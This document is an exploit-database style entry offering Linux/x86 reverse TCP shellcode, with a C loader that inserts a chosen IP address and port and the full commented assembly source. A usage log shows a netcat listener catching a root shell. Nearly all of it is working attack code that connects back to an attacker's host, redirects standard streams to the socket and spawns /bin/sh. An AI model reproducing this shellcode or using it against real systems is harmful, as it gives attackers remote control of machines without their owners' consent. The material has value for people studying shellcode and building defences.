# Exploit Title: Linux/x86 - Reverse (dynamic IP and port/TCP) Shell (/bin/sh) Shellcode (86 bytes)
# Date: 10/07/2021
# Exploit Author: d7x
# Tested on: Ubuntu x86

/***
	Linux/x86 Reverse TCP Shell with dynamic IP and port binding Shellcode (tested on Ubuntu 12.04 LTS)
	Usage: gcc -z execstack -o shell_reverse_tcp shell_reverse_tcp.c
	$ ./shell_reverse_tcp_shellcode 192.168.1.137 4444
	Connecting to 192.168.1.236 (0xec01a8c0):4444 (0x115c)
	Byte 26: c0
	Byte 27: a8
	Byte 28: 01
	Byte 29: ec

	$ nc -nlv 4444
	Listening on 0.0.0.0 4444
	Connection received on 192.168.1.137 45219
	id
	uid=0(root) gid=0(root) groups=0(root)

	*** Created by d7x
		https://d7x.promiselabs.net
		https://www.promiselabs.net ***
***/

#include <stdio.h>
#include <string.h>
#include <netdb.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf0\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"; //IP address at 26th byte; Port at 32nd byte

main(int argc, char *argv[])
{

  /* Default IP and port at 26th and 32nd byte index: \x7f\x01\x01\x01 \x11\x5c */

  // in case no port is provided the default would be used
  if (argc < 3) {
    printf("No IP or port provided, 127.1.1.1:4444 (0x7f010101:0x115c) will be used\n");
  }
  else
  {

	// convert IP address to binary representation and store in ipaddr.sin_addr.s_addr
	struct sockaddr_in ipaddr;
	inet_aton(argv[1], &ipaddr.sin_addr.s_addr);

	int port = atoi(argv[2]);
	printf("Connecting to %s (0x%x):%d (0x%x)\n", argv[1], ipaddr.sin_addr.s_addr, port, port);

	unsigned int p1 = (port >> 8) & 0xff;
	unsigned int p2 = port & 0xff;
	// printf("%x %x\n", p1, p2);

	shellcode[32] = (unsigned char){p1};
	shellcode[33] = (unsigned char){p2};

	/* 	1st byte:  0xAABBCCDD >> 0  & 0xff
		2nd byte:  0xAABBCCDD >> 8  & 0xff
		3rd byte:  0xAABBCCDD >> 16 & 0xff
		4th byte:  0xAABBCCDD >> 24 & 0xff
	*/

	int i, a;
	for (i = 26, a = 0; i <= 29; i++, a+=8)
	{
		shellcode[i] = (ipaddr.sin_addr.s_addr >> a) & 0xff ;
		printf("Byte %d: %.02x\n", i, shellcode[i]);
	}
  }

  int (*ret)() = (int(*)())shellcode;

  ret();

}

/***
; shellcode assembly

global _start:

section .text

_start:
; socketcall (0x66)
;   syscall SYS_SOCKET (0x01) - int socket(int domain, int type, int protocol);
xor eax, eax
xor ebx, ebx
mov al, 0x66
mov bl, 0x01

; pushing arguments to the stack backwards: int protocol (PF_INET, SOCK_STREAM, 0)
xor edx, edx
push edx 		; int domain

push 0x01 		; SOCK_STREAM
push 0x02 		; PF_INET (AF_INET and PF_INET is the same)

mov ecx, esp

; syscall
int 0x80

; save returned file descriptor from eax into esi for later use
mov esi, eax

; socketcall (0x66)
;   syscall  SYS_CONNECT (0x03) - int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
mov al, 0x66
mov bl, 0x03

; pushing arguments to the stack backwards:
; connect(sockid, (struct sockaddr *) &addrport, sizeof(addrport));

push 0x0101017f		; 127.1.1.1
push word 0x5c11 	; port 4444
push word 0x02  	; PF_INET

mov ecx, esp

push 0x10 		; sockaddr length
push ecx 		; sockaddr pointer
push esi 		; saved socket descriptor

mov ecx, esp

; syscall
int 0x80


; dup2 - __NR_dup2                63
; dup2(0), dup2(1), dup2(2)
; (0 - stdin, 1 - stdout, 2 - stderr)

; let's put all this in a loop
xor ecx, ecx

DUPCOUNT:
; int dup2(int oldfd, int newfd);
xor eax, eax
mov al, 0x3f

; ebx (socket descriptor, being copied over from esi saved earlier)
; ecx will be calculated automatically based on the loop value

; xor ebx, ebx
mov ebx, esi  		; saved socket descriptor
; syscall
int 0x80

inc cl
cmp cx, 2
jle DUPCOUNT 		; count until 2 is reached


; execve (0x0b)
;   /bin//sh
xor eax, eax
; xor ebx, ebx
push eax 		; reserve some bytes in the stack to work with

mov al, 0x0b
push 0x68732f2f 	; //sh
push 0x6e69622f 	; /bin
mov ebx, esp

xor ecx, ecx

; syscall
int 0x80
***/